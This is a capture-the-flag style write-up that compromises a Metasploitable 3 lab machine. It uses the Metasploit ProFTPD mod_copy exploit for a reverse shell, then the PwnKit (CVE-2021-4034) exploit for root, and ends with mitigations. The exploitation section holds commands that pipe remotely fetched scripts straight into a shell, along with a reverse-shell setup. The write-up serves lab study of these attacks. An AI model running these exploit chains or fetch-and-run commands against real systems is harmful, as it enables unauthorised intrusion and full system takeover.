# 🧨 Metasploit Table 3 — From Frustration to Root 🚀👑

**Author:** Tayler Derden  
**Category:** CTF / Exploitation Lab  
**Difficulty:** 🔴 Hard  
**Tags:** `Metasploit`, `ProFTPD`, `PwnKit`, `Privilege Escalation`, `Linux`

---

## 📘 Description

This challenge is based on **Metasploitable 3 (Table 3)**.  
The goal: gain initial access, escalate privileges, and become **root**.  

It involves exploiting an **FTP service (ProFTPD)** misconfiguration and then chaining it with a **local privilege escalation (PwnKit, CVE-2021-4034)**.

---

## 🔍 Reconnaissance

### Nmap Scan

```bash
nmap -sS -sV -O -T4 172.28.128.3
```

**Results:**

| Port | Service     | Version             | Notes                                |
|------|-------------|---------------------|--------------------------------------|
| 21   | FTP         | ProFTPD 1.3.5       | Vulnerable to mod_copy RCE           |
| 22   | OpenSSH     | 6.6.1p1             | Old version, not the attack path     |
| 80   | Apache HTTP | 2.4.7 + PHP 7.0.2   | Minor CVEs, but not primary vector   |
| 631  | CUPS        | 1.7                 | Some CVEs, possible Shellshock, skip |

---

## 🔥 Vulnerability: ProFTPD mod_copy (RCE)

The **ProFTPD mod_copy** module allows copying files on the server using FTP commands.  
This can be abused to copy a PHP payload into the webroot, then execute it via the browser.

- **Metasploit module:** `exploit/unix/ftp/proftpd_modcopy_exec`  

---

## 💣 Exploitation

### Step 1: Launch Metasploit Exploit

```bash
msf6 > use exploit/unix/ftp/proftpd_modcopy_exec
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 172.28.128.3
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set LHOST 172.28.128.1
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set LPORT 4444
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > run
```

🎉 **Result:** Reverse shell obtained as **www-data (UID 33)**.  

---

## 🧠 Privilege Escalation

### Step 2: Enumeration with LinPEAS

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

🔎 Found vulnerable **PwnKit (CVE-2021-4034)**.

### Step 3: Exploit PwnKit

```bash
eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
```

🔥 Boom → Got **root access**.  

---

## 🏆 Final Outcome

✔️ Exploited **ProFTPD mod_copy** → gained reverse shell  
✔️ Enumerated with **LinPEAS**  
✔️ Escalated privileges with **PwnKit (CVE-2021-4034)**  
✔️ Achieved **ROOT**  

---

## 🔬 CIA Triad Impact

| Property        | Impact                                                                 |
|-----------------|------------------------------------------------------------------------|
| Confidentiality | 🔴 Full disclosure of sensitive files (config, DB creds, system files) |
| Integrity       | 🔴 Attacker can modify system files, add users, backdoors              |
| Availability    | 🔴 Full DoS possible (delete system binaries, crash services)          |

---

## 🛡️ Mitigation

- Patch **ProFTPD** (remove or update `mod_copy`).  
- Patch **Polkit** to fix **PwnKit (CVE-2021-4034)**.  
- Run services with **least privilege**.  
- Use **segmentation**: FTP/web should not run as privileged users.  
- Continuous monitoring with host-based IDS (e.g. OSSEC).  

---

## 💡 Reflection

This lab was tough but highly rewarding:  
- It taught chaining **service exploitation** + **local privilege escalation**.  
- Reinforced patience, persistence, and using automation (LinPEAS).  
- Demonstrated a **realistic attack path** from **exposed FTP → root compromise**.  

🔥 Day 84 — From scanning → exploitation → privilege escalation → **ROOT**!  
